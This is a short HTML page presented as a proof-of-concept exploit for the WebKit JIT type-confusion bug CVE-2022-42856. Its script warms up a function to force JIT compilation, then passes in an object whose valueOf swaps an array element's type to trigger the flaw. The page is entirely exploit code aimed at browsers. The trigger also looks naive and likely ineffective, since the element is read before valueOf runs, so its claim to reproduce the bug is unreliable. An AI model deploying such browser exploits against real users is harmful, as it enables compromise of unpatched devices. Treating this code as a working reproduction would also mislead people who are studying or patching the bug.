<!DOCTYPE html>
<html>
<head>
  <title>WebKit CVE-2022-42856 PoC</title>
</head>
<body>
  <h1>WebKit JIT Type Confusion PoC</h1>
  <pre id="log">Running...</pre>

  <script>
    function log(msg) {
      document.getElementById("log").textContent += `\n${msg}`;
    }

    function trigger(o, arr) {
      return o.f + arr[0];
    }

    function main() {
      let o = { f: 1.1 };
      let arr = [2.2];

      // Warm-up to force JIT
      for (let i = 0; i < 10000; i++) {
        trigger(o, arr);
      }

      // Fake object to trigger type confusion
      let evil = {
        valueOf: () => {
          arr[0] = {}; // type confusion here if JIT optimized incorrectly
          return 3.3;
        }
      };

      o.f = evil;

      try {
        let res = trigger(o, arr);
        log("Executed, result: " + res);
      } catch (e) {
        log("Caught error: " + e);
      }
    }

    main();
  </script>
</body>
</html>
